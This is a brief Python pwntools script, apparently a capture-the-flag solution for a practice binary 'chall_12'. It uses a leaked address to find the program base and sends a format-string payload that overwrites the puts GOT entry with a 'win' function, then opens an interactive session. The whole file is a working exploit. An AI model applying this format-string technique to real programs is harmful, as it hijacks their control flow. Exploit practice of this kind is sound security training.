# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_12")
    elf= ELF("./chall_12")
    proc.recvuntil(":")
    overflow= proc.recv()
    of= int(overflow, 16)
    elf.address= of-elf.sym.main
    off=7
    p= fmtstr_payload(off,{elf.got.puts:elf.sym.win})
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
